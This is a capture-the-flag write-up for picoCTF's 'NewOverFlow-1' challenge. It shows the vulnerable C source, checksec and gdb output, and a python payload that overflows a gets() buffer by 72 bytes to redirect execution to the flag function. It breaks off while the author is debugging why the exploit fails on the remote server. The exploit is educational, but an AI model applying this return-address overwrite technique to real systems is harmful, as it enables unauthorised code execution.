# NewOverFlow-1
Binary Exploitation, 200 points
## Description:
> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.
```c
#include 
#include 
#include 
#include 
#include 
#define BUFFSIZE 64
#define FLAGSIZE 64
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}
int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
## Solution:
This should be a pretty simple overflow challenge. However, there's a twist.
First, we'll go over the steps that should have worked in a perfect world.
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# checksec.sh -f ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified                                                                                     Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols      No      0                                                                                             6./vuln
```
From the C file we can see that the program allocates a buffer of 64 bytes, and performs an unbound read into the buffer. Since there's no canary and no PIE enabled, we just have to overrun the return address of `vuln` with the address of `flag` and we should see the flag being printed.
We start by configuring the system to create a core dump for the upcoming crash:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# ulimit -c unlimited
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# echo ~/core/core_dump > /proc/sys/kernel/core_pattern
```
Then, we input to the program a 64-bit De-Bruijn sequence using the  `cyclic` utility to locate the overflow offset:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# cyclic -n 8 100 | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
```
We open the core dump with GDB to locate the faulting address:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# gdb ./vuln ~/core/core_dump 2>/dev/null
GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later 
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
.
Find the GDB manual and other documentation resources online at:
.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln...(no debugging symbols found)...done.
[New LWP 1805]
Core was generated by `./vuln'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000000004007e7 in vuln ()
gdb-peda$ bt
#0  0x00000000004007e7 in vuln ()
#1  0x616161616161616a in ?? ()
#2  0x616161616161616b in ?? ()
#3  0x616161616161616c in ?? ()
#4  0x00007f006161616d in ?? ()
#5  0x0000000000000000 in ?? ()
gdb-peda$ quit
```
We search for the faulting address in our cyclic sequence to get the overflow offset:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# cyclic -n 8 -l 0x616161616161616a
72
```
We check what `flag`'s address is:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# objdump -D ./vuln | grep ""
0000000000400767 :
```
And we perform the overflow:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{local_fake_flag}
Segmentation fault (core dumped)
```
This works great locally (buffer overflow 101, they promised to "start easy"). However, if we run this on the server, we get a different response:
```console
dvdalt@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
```
We just get a segmentation fault - no flag!
Let's try to debug (we have to create a fake flag file since debugging a `setuid` program removes the extra permissions due to obvious reasons).
```
dvdalt@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ cd ~
dvdalt@pico-2019-shell1:~$ echo picoCTF{fake_remote_flag} > flag.txt
dvdalt@pico-2019-shell1:~$ gdb /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later 
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
.
Find the GDB manual and other documentation resources online at:
.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln...(no debugging symbols found)...done.
(gdb) r , format=format@entry=0x7fff815cbc28 "picoCTF{fake_remote_flag}\n", args=args@entry=0x7fff815cbb48) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
```
Looks like we hit an exception in `printf`, while attempting to print the flag.
Here's the faulting command: